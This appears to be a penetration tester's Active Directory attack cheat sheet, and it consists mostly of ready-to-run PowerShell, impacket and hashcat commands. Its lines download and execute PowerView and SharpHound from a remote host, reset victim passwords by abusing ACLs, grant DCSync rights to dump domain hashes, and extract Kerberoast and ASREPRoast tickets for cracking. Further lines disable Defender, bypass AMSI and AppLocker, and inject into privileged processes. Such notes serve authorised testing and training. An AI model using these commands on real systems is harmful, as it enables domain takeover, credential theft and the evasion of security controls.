Active Directory attack
Domain Enumeration + Exploitation
POWERSPLOIT
Use the dev branch or PowerSploit. For an already incredible cheat sheet, check out HarmJ0y's.
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
Get Domain Users
Get-NetUser * -Domain corp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname, serviceprincipalname, mail,useraccountcontrol | Export-CSV users.csv
Get Domain Computers
Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv
SPN Ticket Request
Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation
Enumerate User DACLs
1
PS C:\> Get-DomainObjectAcl -Identity it_admin -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID burmat) }
2
​
3
AceType               : AccessAllowed
4
ObjectDN              : CN=it_admin,CN=Users,DC=BURMAT,DC=CO
5
ActiveDirectoryRights : GenericAll
6
OpaqueLength          : 0
7
ObjectSID             : S-1-5-21-2736429227-4547413232-2815246478-1130
8
InheritanceFlags      : None
9
BinaryLength          : 36
10
IsInherited           : False
11
IsCallback            : False
12
PropagationFlags      : None
13
SecurityIdentifier    : S-1-5-21-2736429227-4547413232-2815246478-1107
14
AccessMask            : 983551
15
AuditFlags            : None
16
AceFlags              : None
17
AceQualifier          : AccessAllowed
Copied!
Reset Domain User Password
If you own the owner of another AD user object (WriteOwner, WriteDACL, GenericWrite, Owner, etc), you can reset the password with ease:
1
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
2
​
3
$user = 'DOMAIN\owner_acct'; 
4
$pass= ConvertTo-SecureString 'Password123!' -AsPlainText -Force; 
5
$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
6
​
7
$newpass = ConvertTo-SecureString 'burmatw@sh3r3' -AsPlainText -Force; 
8
​
9
Set-DomainUserPassword -Identity 'DOMAIN\vuln_user' -AccountPassword $newpass -Credential $creds;
Copied!
Or if you can set yourself as owner, the following will do:
1
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.123/ps/PowerView.ps1')
2
Set-DomainObjectOwner -Identity it_admin -OwnerIdentity burmat
3
Add-DomainObjectAcl -TargetIdentity it_admin -PrincipalIdentity burmat
4
$newpass = ConvertTo-SecureString -String 'burmat123$' -AsPlainText -Force
5
Set-DomainUserPassword -Identity it_admin -AccountPassword $newpass
Copied!
Add/Exploit DCSync Rights
Do you have WriteDACL to a domain? Give DCSync rights to an unprivileged domain user account:
Add-DomainObjectAcl -TargetIdentity "DC=burmatco,DC=local" -PrincipalIdentity useracct1 -Rights DCSync
And use these rights to dump the hashes from the domain:
meterpreter > dcsync_ntlm BURMATCO\\useracct1
BLOODHOUND
Ingestor Launch
1
IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.ps1');
2
Invoke-BloodHound -CollectionMethod All -CompressData -SkipPing;
Copied!
LDAP QUERIES
Below are some useful LDAP queries that will help you enumerate a system. Some of them require a valid username/password to get more information. My go-to for these queries is ldapsearch:
1
ldapsearch -LLL -x -H ldap://burmat.co -D "svc-burmat" -w "burmat123$" -b "dc=burmat,dc=co" "<LDAP QUERY HERE>"
Copied!
ASREPRoast Accounts
1
## ldap filter to find accounts susceptible to this:
2
"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
3
​
4
## generate a list of user accounts and use impacket to exploit:
5
python GetNPUsers.py -request -no-pass -dc-ip 10.1.1.123 burmat.co/ -usersfile users.txt
6
​
7
## and if you get a ticket, you can crack it:
8
hashcat -m 18200 -a 0 --force user.hash /usr/share/wordlists/rockyou.txt
Copied!
User Account Objects with SPNs
1
"(&(&(servicePrincipalName=*) (UserAccountControl:1.2.840.113556.1.4.803:=512)) (!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
2
​
3
## if you get valid domain credentials, you can dump them w/ impacket for offline cracking:
4
python GetUserSPNs.py -request burmat.co/svc-burmat:burmat123$
Copied!
User and Computers with Unconstrained Delegation
1
# user:
2
"(&(&(objectCategory=person) (objectClass=user)) (userAccountControl:1.2.840.113556.1.4.803:=524288))"
3
​
4
# computer:
5
"(&(objectCategory=computer) (objectClass=computer) (userAccountControl:1.2.840.113556.1.4.803:=524288))"
Copied!
Domain Administrators
1
"(&(objectClass=user) (memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=burmat,DC=co))"
Copied!
Group Policies
1
"objectClass=groupPolicyContainer"
Copied!
EVADING AV
Checking Status
1
# is av enabled:
2
PS C:\> Get-MpComputerStatus
3
​
4
# applocker rules:
5
PS C:\> $a = Get-ApplockerPolicy -effective
6
PS C:\> $a.rulecollections
7
​
8
# constrained?:
9
PS C:\> $ExecutionContext.SessionState.LanguageMode
Copied!
PowerShell Bypass with 32-bit
PowerShell disabled for you? Try running the 32-bit copy of it:
C:\windows\syswow64\windowspowershell\v1.0\powershell whoami
Writable Folders for Bypassing Execution Control
Try putting your payload in one of the following directories:
1
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
2
C:\Windows\System32\spool\drivers\color
3
C:\Windows\Tasks
4
C:\windows\tracing
Copied!
Turning Off Defender's RTM
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
AMSI Bypass
1
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
Copied!
PROCESS ELEVATION (via SeDebugPrivilege)
If you run whoami /priv and you see SeDebugPrivilege set to Enabled, you can assume you already have SYSTEM.
One way of doing it, is using decoder's psgetsys.ps1 script once you have a good idea on a PID to inject:
. .\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(7864,'C:\temp\burmat443.exe');
You can also gain a MSF session and use the module windows/manage/payload_inject with a PID of your choice.
REMOTE DESKTOP
Enable RDP
1
PS C:\> Set-itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -value 0
2
PS C:\> Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\' -Name "UserAuthentication" -value 1
3
PS C:\> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Copied!
MISCELLANEOUS
1
# list shared folders
2
PS> Get-WmiObject -Class Win32_Share -Computer dc1.burmat.co

